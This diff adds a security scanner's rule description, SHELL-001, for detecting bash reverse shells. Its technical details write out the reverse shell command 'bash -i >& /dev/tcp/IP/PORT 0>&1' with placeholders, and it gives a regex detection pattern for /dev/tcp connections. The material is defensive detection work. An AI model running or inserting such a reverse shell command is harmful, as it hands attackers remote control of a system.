@@ -1,0 +1,28 @@
+
+======================================================================
+SHELL-001 Bash reverse shell [CRITICAL]
+======================================================================
+
+Category:
+  Malicious Code  (detector: rules)
+
+Description:
+  Pattern indicates a bash reverse shell connection
+
+Recommendation:
+  Remove reverse shell code immediately
+
+CWE: CWE-506
+
+Technical Details:
+  Bash's /dev/tcp is a pseudo-device that creates TCP connections.
+  Pattern: bash -i >& /dev/tcp/IP/PORT 0>&1 redirects
+  stdin/stdout/stderr to the attacker's listener.
+
+Detection Patterns:
+  - /dev/tcp/\d+\.\d+\.\d+\.\d+/\d+
+
+Related Codes:
+  SHELL-002, SHELL-003, SHELL-004
+
+======================================================================
